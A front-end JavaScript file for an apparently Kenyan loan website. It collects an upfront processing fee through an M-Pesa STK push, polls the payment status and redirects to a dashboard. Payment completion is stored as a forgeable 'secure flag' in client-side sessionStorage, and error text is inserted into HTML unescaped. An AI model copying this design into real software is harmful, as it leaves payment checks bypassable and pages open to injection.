// Load user data from SessionStorage
const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');

// Redirect if no phone number is found (prevents direct access)
if (!userData.phone_number) {
    window.location.href = '/eligibility';
}

document.getElementById('user-name').textContent = userData.name || 'Customer';

let selectedLoan = null;

function formatMoney(amount) {
    return `Ksh ${Number(amount).toLocaleString()}`;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper to format phone number to 254XXXXXXXXX
function formatPhoneNumber(phone) {
    let p = phone.toString().replace(/\D/g, ''); // Remove non-digits
    if (p.startsWith('0')) {
        return '254' + p.substring(1);
    }
    if (p.startsWith('7') || p.startsWith('1')) {
        return '254' + p;
    }
    if (p.startsWith('254')) {
        return p;
    }
    return p;
}

// Handle Loan Selection
function selectLoanOption(element, amount, fee) {
    const applyBtn = document.getElementById('apply-btn');

    // Remove "selected" class from all
    document.querySelectorAll('.loan-option').forEach(opt => {
        opt.classList.remove('selected');
    });

    // Add "selected" class to clicked element
    element.classList.add('selected');

    // Update state
    selectedLoan = { amount, fee };

    // Enable button and hide errors
    applyBtn.disabled = false;
    applyBtn.classList.add('is-ready');
    document.getElementById('error-message').style.display = 'none';

    // Update Session Storage
    userData.loan_amount = amount;
    userData.processing_fee = fee;
    sessionStorage.setItem('myLoan', JSON.stringify(userData));

    // Jump user to the call-to-action after choosing amount.
    applyBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
    applyBtn.focus({ preventScroll: true });
    applyBtn.classList.remove('jump-focus');
    void applyBtn.offsetWidth;
    applyBtn.classList.add('jump-focus');
}

// Handle Apply Button Click
document.getElementById('apply-btn').addEventListener('click', async function () {
    if (!selectedLoan) {
        document.getElementById('error-message').style.display = 'block';
        return;
    }

    const confirmResult = await Swal.fire({
        title: 'Confirm Loan Request',
        html: `
            <div class="modern-summary-card">
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Loan Amount</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.amount)}</span>
                </div>
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Processing Fee</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.fee)}</span>
                </div>
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Total Repayment</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.amount * 1.1)}</span>
                </div>
            </div>
            <div class="modern-phone-pill">
                <i class="fas fa-mobile-alt"></i> ${userData.phone_number}
            </div>
        `,
        showCancelButton: true,
        confirmButtonText: 'Proceed',
        cancelButtonText: 'Change Amount',
        buttonsStyling: false,
        customClass: {
            popup: 'modern-popup',
            htmlContainer: 'modern-html',
            actions: 'modern-actions',
            confirmButton: 'modern-confirm-btn',
            cancelButton: 'modern-cancel-btn'
        }
    });

    // 2. Process Payment if Confirmed
    if (confirmResult.isConfirmed) {
        Swal.fire({
            title: 'Sending M-Pesa Prompt',
            html: `
                <div class="modern-processing">
                    <div class="modern-spinner"></div>
                    <div class="modern-processing-title">Connecting securely...</div>
                    <div class="modern-processing-note">Please wait while we initiate your payment request.</div>
                </div>
            `,
            showConfirmButton: false,
            allowOutsideClick: false,
            customClass: {
                popup: 'modern-popup',
                htmlContainer: 'modern-html'
            }
        });

        try {
            const formattedPhone = formatPhoneNumber(userData.phone_number);

            const readinessResponse = await fetch('https://denoki.onrender.com/api/stk_readiness');
            const readiness = await readinessResponse.json();
            if (!readiness.ok) {
                throw new Error(`STK setup incomplete: ${readiness.missing.join(', ')}`);
            }

            // Call backend with retry/backoff for transient Daraja outages.
            let result = null;
            const maxInitiateAttempts = 3;
            for (let attempt = 1; attempt <= maxInitiateAttempts; attempt++) {
                const response = await fetch('https://denoki.onrender.com/api/stk_initiate.js', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: formattedPhone,
                        amount: selectedLoan.fee
                    })
                });

                try {
                    result = await response.json();
                } catch (_err) {
                    throw new Error('Backend returned an invalid response.');
                }

                if (response.ok) {
                    break;
                }

                const retryable = Boolean(result?.retryable);
                const canRetry = retryable && attempt < maxInitiateAttempts;
                if (!canRetry) {
                    throw new Error(result?.message || 'STK initiation failed.');
                }

                const retryDelay = Number(result?.retryAfterMs || 2500) + ((attempt - 1) * 1500);
                Swal.update({
                    html: `
                        <div class="modern-processing">
                            <div class="modern-spinner"></div>
                            <div class="modern-processing-title">Retrying M-Pesa Prompt (${attempt}/${maxInitiateAttempts - 1})</div>
                            <div class="modern-processing-note">Daraja is temporarily unavailable. Retrying in ${Math.ceil(retryDelay / 1000)}s...</div>
                        </div>
                    `
                });
                await sleep(retryDelay);
            }

            if (result.success) {
                const checkoutRequestId = result.data.CheckoutRequestID;

                // 3. Show Polling UI
                Swal.fire({
                    title: 'Confirm on Your Phone',
                    html: `
                        <div class="modern-processing">
                            <div class="modern-spinner"></div>
                            <div class="modern-processing-title">Check Your M-Pesa Prompt</div>
                            <div class="modern-processing-note">Enter your PIN to pay <strong>${formatMoney(selectedLoan.fee)}</strong>.</div>
                            <div class="modern-processing-phone">${formattedPhone}</div>
                        </div>
                    `,
                    showConfirmButton: false,
                    allowOutsideClick: false,
                    customClass: {
                        popup: 'modern-popup',
                        htmlContainer: 'modern-html'
                    }
                });

                // 4. Poll for Status
                let attempts = 0;
                const maxAttempts = 20; // 20 * 3s = 60 seconds timeout

                const pollInterval = setInterval(async () => {
                    attempts++;
                    try {
                        const statusResp = await fetch('https://denoki.onrender.com/api/stk_status.js', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ checkoutRequestId })
                        });
                        const statusResult = await statusResp.json();

                        if (statusResult.status === 'COMPLETED') {
                            clearInterval(pollInterval);

                            // Set secure flag
                            sessionStorage.setItem('payment_status', 'completed');
                            sessionStorage.setItem('payment_time', new Date().toISOString());

                            Swal.fire({
                                icon: 'success',
                                title: 'Payment Successful!',
                                text: 'Redirecting to your dashboard...',
                                timer: 2000,
                                showConfirmButton: false
                            }).then(() => {
                                window.location.href = '/dash';
                            });
                        } else if (statusResult.status === 'FAILED') {
                            clearInterval(pollInterval);
                            const retryChoice = await Swal.fire({
                                icon: 'error',
                                title: 'Payment Failed',
                                text: statusResult.message || 'The transaction was not completed.',
                                showCancelButton: true,
                                confirmButtonText: 'Retry Now',
                                cancelButtonText: 'Close',
                                confirmButtonColor: '#00A651'
                            });
                            if (retryChoice.isConfirmed) {
                                setTimeout(() => document.getElementById('apply-btn').click(), 100);
                            }
                        } else {
                            // Still PENDING
                            if (attempts >= maxAttempts) {
                                clearInterval(pollInterval);
                                const timeoutChoice = await Swal.fire({
                                    icon: 'warning',
                                    title: 'Timeout',
                                    text: 'We could not verify your payment in time. Please check your SMS.',
                                    showCancelButton: true,
                                    confirmButtonText: 'Retry Now',
                                    cancelButtonText: 'Close',
                                    confirmButtonColor: '#00A651'
                                });
                                if (timeoutChoice.isConfirmed) {
                                    setTimeout(() => document.getElementById('apply-btn').click(), 100);
                                }
                            }
                        }
                    } catch (e) {
                        console.error('Polling error', e);
                        // Don't stop polling on network error, just wait for next tick
                    }
                }, 3000);

            } else {
                throw new Error(result.message || 'Failed to initiate payment');
            }
        } catch (error) {
            console.error('Payment error:', error);
            const lowerMsg = String(error.message || '').toLowerCase();
            const helpText = lowerMsg.includes('wrong credentials')
                ? 'Daraja credentials mismatch: verify shortcode and Lipa na M-Pesa passkey.'
                : lowerMsg.includes('agent number and store number entered do not match')
                ? 'BuyGoods profile mismatch: ensure shortcode and passkey are from the same till/store profile in Daraja.'
                : 'Daraja may be slow or unavailable. Wait a moment and try again.';
            const retryChoice = await Swal.fire({
                title: 'Payment Failed',
                html: `
                    <p style="font-size: 0.9rem;">${error.message || 'Unable to process payment. Please try again.'}</p>
                    <p style="font-size: 0.8rem; color: #666; margin-top: 10px;">
                        ${helpText}
                    </p>
                `,
                icon: 'error',
                showCancelButton: true,
                confirmButtonText: 'Retry Now',
                cancelButtonText: 'Close',
                confirmButtonColor: '#00A651',
                customClass: {
                    popup: 'modern-popup',
                    htmlContainer: 'modern-html'
                }
            });
            if (retryChoice.isConfirmed) {
                setTimeout(() => document.getElementById('apply-btn').click(), 100);
            }
        }
    }
});
